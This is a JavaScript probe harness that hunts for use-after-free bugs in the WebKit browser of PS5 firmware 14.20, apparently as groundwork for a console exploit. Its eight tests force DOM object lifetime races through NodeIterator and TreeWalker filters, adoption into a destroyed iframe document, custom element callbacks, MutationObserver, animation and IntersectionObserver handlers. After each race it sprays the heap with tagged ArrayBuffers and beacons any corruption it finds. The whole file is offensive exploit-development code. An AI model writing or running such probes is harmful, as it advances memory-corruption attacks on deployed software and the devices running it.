// p216 — DOM lifecycle UAF probes
// Novel patterns targeting WebCore object lifetimes during callbacks.
// These are NOT known CVEs — they're hunting for unpatched patterns
// in PS5 14.20's Dec 2023 WebKit.
//
// A: NodeIterator filter removes current node during traversal
// B: TreeWalker filter removes subtree during traversal
// C: adoptNode into destroyed iframe document
// D: Custom Element adoptedCallback + disconnectedCallback race
// E: Range extractContents during MutationObserver
// F: CSS animation end + element removal + spray
// G: DOMNodeRemovedFromDocument legacy event + tree mutation
// H: IntersectionObserver disconnect during callback
//
// Beacon prefix: V216-

(function() {
  function B(tag) {
    try {
      var x = new XMLHttpRequest();
      x.open('GET', '/beacon/V216-' + tag + '?t=' + Date.now(), false);
      x.send();
    } catch (e) {}
  }

  B('BOOT');

  var SPRAY_SZ = [64, 96, 128, 256, 512];
  var SPRAY_N = 2000;

  function spray(round) {
    var bufs = [];
    for (var s = 0; s < SPRAY_SZ.length; s++) {
      for (var i = 0; i < SPRAY_N; i++) {
        var ab = new ArrayBuffer(SPRAY_SZ[s]);
        var dv = new DataView(ab);
        dv.setUint32(0, 0xBAADF00D, true);
        dv.setUint32(4, SPRAY_SZ[s], true);
        dv.setUint32(8, i, true);
        dv.setUint32(12, round, true);
        bufs.push(ab);
      }
    }
    return bufs;
  }

  function checkSpray(bufs) {
    var corrupt = 0;
    var detail = '';
    for (var i = 0; i < bufs.length; i++) {
      try {
        var dv = new DataView(bufs[i]);
        if (dv.getUint32(0, true) !== 0xBAADF00D) {
          corrupt++;
          if (!detail) {
            var u8 = new Uint8Array(bufs[i]);
            var hex = '';
            for (var j = 0; j < Math.min(32, u8.length); j++)
              hex += ('0' + u8[j].toString(16)).slice(-2);
            detail = 'I' + i + '-' + hex;
          }
        }
      } catch (e) {
        corrupt++;
        if (!detail) detail = 'I' + i + '-ERR';
      }
    }
    return {count: corrupt, detail: detail};
  }

  var tests = [];
  var currentTest = 0;

  // ── TEST A: NodeIterator — filter removes current node ──
  tests.push({name: 'A-NODEITER', run: function(done) {
    try {
      var container = document.createElement('div');
      document.body.appendChild(container);
      for (var i = 0; i < 200; i++) {
        var child = document.createElement('span');
        child.textContent = 'N' + i;
        child.setAttribute('data-idx', i);
        container.appendChild(child);
      }
      B('A-TREE-200');

      var removed = 0;
      var iter = document.createNodeIterator(container, NodeFilter.SHOW_ELEMENT, {
        acceptNode: function(node) {
          if (node.getAttribute && node.getAttribute('data-idx')) {
            var idx = parseInt(node.getAttribute('data-idx'));
            if (idx > 0 && idx % 3 === 0 && node.parentNode) {
              node.parentNode.removeChild(node);
              removed++;
            }
          }
          return NodeFilter.FILTER_ACCEPT;
        }
      });

      var visited = 0;
      var n;
      while ((n = iter.nextNode()) !== null) {
        visited++;
        if (visited > 500) break;
      }
      B('A-VISITED-' + visited + '-REMOVED-' + removed);

      // Now spray and check
      var sp = spray(1);
      // Force GC
      for (var g = 0; g < 50000; g++) new ArrayBuffer(128);
      var result = checkSpray(sp);
      B('A-CORRUPT-' + result.count);
      if (result.detail) B('A-HEX-' + result.detail);
      container.remove();
    } catch (e) {
      B('A-ERR-' + e.name + '-' + e.message.substring(0, 60));
    }
    done();
  }});

  // ── TEST B: TreeWalker — filter removes entire subtree during walk ──
  tests.push({name: 'B-TREEWALK', run: function(done) {
    try {
      var container = document.createElement('div');
      document.body.appendChild(container);
      // Build a deep tree with multiple branches
      for (var i = 0; i < 20; i++) {
        var branch = document.createElement('div');
        branch.setAttribute('data-branch', i);
        for (var j = 0; j < 10; j++) {
          var leaf = document.createElement('span');
          leaf.textContent = 'B' + i + 'L' + j;
          branch.appendChild(leaf);
        }
        container.appendChild(branch);
      }
      B('B-TREE-20x10');

      var removedBranches = 0;
      var walker = document.createTreeWalker(container, NodeFilter.SHOW_ELEMENT, {
        acceptNode: function(node) {
          if (node.getAttribute && node.getAttribute('data-branch')) {
            var bi = parseInt(node.getAttribute('data-branch'));
            if (bi % 4 === 2 && node.parentNode) {
              // Remove this entire branch while walker is inside it
              var sibling = node.nextSibling;
              node.parentNode.removeChild(node);
              removedBranches++;
              // Also remove the next branch to create a gap
              if (sibling && sibling.parentNode) {
                sibling.parentNode.removeChild(sibling);
                removedBranches++;
              }
            }
          }
          return NodeFilter.FILTER_ACCEPT;
        }
      });

      var visited = 0;
      while (walker.nextNode()) {
        visited++;
        if (visited > 1000) break;
      }
      B('B-VISITED-' + visited + '-REMOVED-' + removedBranches);

      var sp = spray(2);
      for (var g = 0; g < 50000; g++) new ArrayBuffer(96);
      var result = checkSpray(sp);
      B('B-CORRUPT-' + result.count);
      if (result.detail) B('B-HEX-' + result.detail);
      container.remove();
    } catch (e) {
      B('B-ERR-' + e.name + '-' + e.message.substring(0, 60));
    }
    done();
  }});

  // ── TEST C: adoptNode into destroyed iframe document ──
  tests.push({name: 'C-ADOPT-DEAD', run: function(done) {
    try {
      var iframe = document.createElement('iframe');
      document.body.appendChild(iframe);
      var deadDoc = iframe.contentDocument;
      iframe.remove(); // Destroy iframe
      B('C-IFRAME-DESTROYED');

      // Create nodes in main document
      var nodes = [];
      for (var i = 0; i < 100; i++) {
        var el = document.createElement('div');
        el.textContent = 'Adopt' + i;
        el.setAttribute('data-val', i);
        nodes.push(el);
      }

      // Try to adopt into the dead document
      var adopted = 0;
      var errors = 0;
      for (var j = 0; j < nodes.length; j++) {
        try {
          deadDoc.adoptNode(nodes[j]);
          adopted++;
        } catch (e) {
          errors++;
          if (errors === 1) B('C-ADOPT-ERR-' + e.name);
        }
      }
      B('C-ADOPTED-' + adopted + '-ERR-' + errors);

      // Now spray
      var sp = spray(3);
      var result = checkSpray(sp);
      B('C-CORRUPT-' + result.count);
      if (result.detail) B('C-HEX-' + result.detail);

      // Try to access adopted nodes
      for (var k = 0; k < Math.min(5, adopted); k++) {
        try {
          B('C-NODE' + k + '-' + nodes[k].textContent + '-' + nodes[k].ownerDocument.URL.substring(0, 30));
        } catch (e) {
          B('C-NODE' + k + '-ACCESS-ERR');
        }
      }
    } catch (e) {
      B('C-ERR-' + e.name + '-' + e.message.substring(0, 60));
    }
    done();
  }});

  // ── TEST D: Custom Element lifecycle during cross-doc adoption ──
  tests.push({name: 'D-CE-ADOPT', run: function(done) {
    try {
      var tagName = 'evil-ce-' + (Date.now() % 100000);
      var disconnects = 0;
      var connects = 0;
      var adopts = 0;
      var iframe = document.createElement('iframe');
      document.body.appendChild(iframe);
      var otherDoc = iframe.contentDocument;

      var EvilClass = function() { return Reflect.construct(HTMLElement, [], EvilClass); };
      EvilClass.prototype = Object.create(HTMLElement.prototype);
      EvilClass.prototype.constructor = EvilClass;
      EvilClass.prototype.disconnectedCallback = function() {
        disconnects++;
        // During disconnect, try to adopt into other document
        try {
          otherDoc.adoptNode(this);
        } catch (e) {}
        // Also trigger GC pressure
        for (var g = 0; g < 10000; g++) new ArrayBuffer(128);
      };
      EvilClass.prototype.connectedCallback = function() {
        connects++;
      };
      EvilClass.prototype.adoptedCallback = function() {
        adopts++;
        // During adopt callback, remove from new parent and add elsewhere
        try {
          if (this.parentNode) this.parentNode.removeChild(this);
          otherDoc.body.appendChild(this);
        } catch (e) {}
      };

      customElements.define(tagName, EvilClass);
      B('D-CE-DEFINED-' + tagName);

      // Create elements in main doc, then rapidly move between documents
      var elements = [];
      for (var i = 0; i < 50; i++) {
        var el = document.createElement(tagName);
        el.textContent = 'CE' + i;
        document.body.appendChild(el);
        elements.push(el);
      }
      B('D-CONNECTED-' + connects);

      // Remove all from main doc (triggers disconnectedCallback which adopts into iframe doc)
      for (var j = 0; j < elements.length; j++) {
        if (elements[j].parentNode) elements[j].parentNode.removeChild(elements[j]);
      }
      B('D-DISC-' + disconnects + '-ADOPT-' + adopts);

      // Destroy iframe while elements might reference its document
      iframe.remove();
      B('D-IFRAME-DESTROYED');

      // GC + spray
      for (var g = 0; g < 50000; g++) new ArrayBuffer(96);
      var sp = spray(4);
      var result = checkSpray(sp);
      B('D-CORRUPT-' + result.count);
      if (result.detail) B('D-HEX-' + result.detail);

      // Try to access elements that were adopted into destroyed doc
      for (var k = 0; k < Math.min(5, elements.length); k++) {
        try {
          var txt = elements[k].textContent;
          var doc = elements[k].ownerDocument;
          B('D-EL' + k + '-TXT-' + txt);
        } catch (e) {
          B('D-EL' + k + '-ERR-' + e.name);
        }
      }
    } catch (e) {
      B('D-ERR-' + e.name + '-' + e.message.substring(0, 60));
    }
    done();
  }});

  // ── TEST E: Range extractContents during MutationObserver ──
  tests.push({name: 'E-RANGE-MO', run: function(done) {
    try {
      var container = document.createElement('div');
      document.body.appendChild(container);
      for (var i = 0; i < 100; i++) {
        var p = document.createElement('p');
        p.textContent = 'Paragraph ' + i + ' with some longer text content here';
        container.appendChild(p);
      }

      var range = document.createRange();
      range.selectNodeContents(container);
      B('E-RANGE-SET');

      var moFired = 0;
      var extractedDuringMO = false;
      var observer = new MutationObserver(function(mutations) {
        moFired++;
        if (moFired === 1 && !extractedDuringMO) {
          extractedDuringMO = true;
          // During the MO callback for the first mutation,
          // extract the range contents (which modifies the tree further)
          try {
            var frag = range.extractContents();
            B('E-EXTRACTED-' + frag.childNodes.length);
          } catch (e) {
            B('E-EXTRACT-ERR-' + e.name);
          }
        }
      });
      observer.observe(container, {childList: true, subtree: true});

      // Trigger mutation that fires MO
      container.removeChild(container.firstChild);
      B('E-REMOVED-FIRST');

      // MO fires asynchronously — wait a frame
      setTimeout(function() {
        B('E-MO-FIRED-' + moFired);
        observer.disconnect();

        var sp = spray(5);
        var result = checkSpray(sp);
        B('E-CORRUPT-' + result.count);
        if (result.detail) B('E-HEX-' + result.detail);
        container.remove();
        done();
      }, 100);
    } catch (e) {
      B('E-ERR-' + e.name + '-' + e.message.substring(0, 60));
      done();
    }
  }});

  // ── TEST F: CSS animation end + element destruction ──
  tests.push({name: 'F-ANIM-UAF', run: function(done) {
    try {
      var style = document.createElement('style');
      style.textContent = '@keyframes uaf-anim { 0% { opacity: 1; } 100% { opacity: 0; } }';
      document.head.appendChild(style);

      var container = document.createElement('div');
      document.body.appendChild(container);

      var animEnded = 0;
      var rounds = 30;

      function runRound(r) {
        if (r >= rounds) {
          B('F-ROUNDS-' + rounds + '-ENDED-' + animEnded);
          style.remove();
          container.remove();
          done();
          return;
        }

        var el = document.createElement('div');
        el.style.cssText = 'width:10px;height:10px;animation:uaf-anim 0.01s forwards;';
        el.textContent = 'A' + r;
        container.appendChild(el);

        el.addEventListener('animationend', function() {
          animEnded++;
          // Remove element during animationend handler
          el.remove();
          // Spray to reclaim the RenderObject/RenderLayer
          for (var g = 0; g < 5000; g++) new ArrayBuffer(128);
          // Force layout on remaining elements
          if (container.firstChild) {
            var _ = container.offsetHeight;
          }
        });

        setTimeout(function() { runRound(r + 1); }, 30);
      }

      runRound(0);
    } catch (e) {
      B('F-ERR-' + e.name + '-' + e.message.substring(0, 60));
      done();
    }
  }});

  // ── TEST G: Legacy DOMNodeRemoved event + tree restructure ──
  tests.push({name: 'G-LEGACY-EVT', run: function(done) {
    try {
      var container = document.createElement('div');
      document.body.appendChild(container);
      var children = [];
      for (var i = 0; i < 100; i++) {
        var el = document.createElement('div');
        el.textContent = 'LN' + i;
        container.appendChild(el);
        children.push(el);
      }

      var evtCount = 0;
      var supported = false;
      // DOMNodeRemoved is a legacy synchronous mutation event
      container.addEventListener('DOMNodeRemoved', function(e) {
        evtCount++;
        supported = true;
        if (evtCount <= 3) {
          // During removal event, move other children around
          try {
            var target = children[Math.min(evtCount * 10, children.length - 1)];
            if (target && target.parentNode === container) {
              container.insertBefore(target, container.firstChild);
            }
            // Also create and insert new elements
            var newEl = document.createElement('span');
            newEl.textContent = 'injected' + evtCount;
            container.appendChild(newEl);
          } catch (ex) {}
        }
      }, false);

      // Remove all children — each fires DOMNodeRemoved
      var removed = 0;
      for (var j = children.length - 1; j >= 0; j--) {
        try {
          if (children[j].parentNode) {
            container.removeChild(children[j]);
            removed++;
          }
        } catch (e) {
          B('G-REMOVE-ERR-' + j);
          break;
        }
      }
      B('G-REMOVED-' + removed + '-EVT-' + evtCount + '-SUP-' + supported);

      var sp = spray(7);
      var result = checkSpray(sp);
      B('G-CORRUPT-' + result.count);
      if (result.detail) B('G-HEX-' + result.detail);
      container.remove();
    } catch (e) {
      B('G-ERR-' + e.name + '-' + e.message.substring(0, 60));
    }
    done();
  }});

  // ── TEST H: content-visibility + IntersectionObserver + forced reflow ──
  tests.push({name: 'H-CV-IO', run: function(done) {
    try {
      // Create a scrollable container with content-visibility: auto elements
      var scroll = document.createElement('div');
      scroll.style.cssText = 'width:200px;height:100px;overflow:auto;position:relative;';
      document.body.appendChild(scroll);

      var items = [];
      for (var i = 0; i < 50; i++) {
        var item = document.createElement('div');
        item.style.cssText = 'height:50px;content-visibility:auto;contain-intrinsic-size:auto 50px;';
        item.textContent = 'CV-Item-' + i;
        // Add complex children
        for (var j = 0; j < 5; j++) {
          var child = document.createElement('div');
          child.style.cssText = 'height:10px;background:red;margin:2px;';
          child.textContent = 'child' + j;
          item.appendChild(child);
        }
        scroll.appendChild(item);
        items.push(item);
      }
      B('H-CV-ITEMS-' + items.length);

      var cvSupported = (items[0].style.contentVisibility === 'auto');
      B('H-CV-SUPPORTED-' + cvSupported);

      if (!cvSupported) {
        scroll.remove();
        done();
        return;
      }

      // Observe all items with IntersectionObserver
      var ioFired = 0;
      var io = new IntersectionObserver(function(entries) {
        ioFired += entries.length;
        // During IO callback, remove some items and force layout
        for (var k = 0; k < entries.length; k++) {
          if (!entries[k].isIntersecting && entries[k].target.parentNode) {
            entries[k].target.remove();
            // Spray to reclaim RenderLayer
            for (var g = 0; g < 1000; g++) new ArrayBuffer(512);
          }
        }
        // Force layout to trigger content-visibility recalc
        var _ = scroll.scrollHeight;
      }, {root: scroll, threshold: 0});

      for (var m = 0; m < items.length; m++) io.observe(items[m]);

      // Rapidly scroll to trigger visibility changes
      var scrollSteps = 0;
      function doScroll() {
        if (scrollSteps >= 20) {
          B('H-SCROLLED-' + scrollSteps + '-IO-' + ioFired);
          io.disconnect();

          var sp = spray(8);
          var result = checkSpray(sp);
          B('H-CORRUPT-' + result.count);
          if (result.detail) B('H-HEX-' + result.detail);
          scroll.remove();
          done();
          return;
        }
        scroll.scrollTop = scrollSteps * 100;
        var _ = scroll.scrollHeight; // force layout
        scrollSteps++;
        setTimeout(doScroll, 50);
      }
      doScroll();
    } catch (e) {
      B('H-ERR-' + e.name + '-' + e.message.substring(0, 60));
      done();
    }
  }});

  // ── Run all tests ──
  function runNext() {
    if (currentTest >= tests.length) {
      B('ALL-DONE');
      return;
    }
    var t = tests[currentTest++];
    B(t.name + '-START');
    var completed = false;
    var timeout = setTimeout(function() {
      if (!completed) { completed = true; B(t.name + '-TIMEOUT'); runNext(); }
    }, 30000);
    t.run(function() {
      if (!completed) {
        completed = true;
        clearTimeout(timeout);
        B(t.name + '-END');
        setTimeout(runNext, 500);
      }
    });
  }

  runNext();
})();
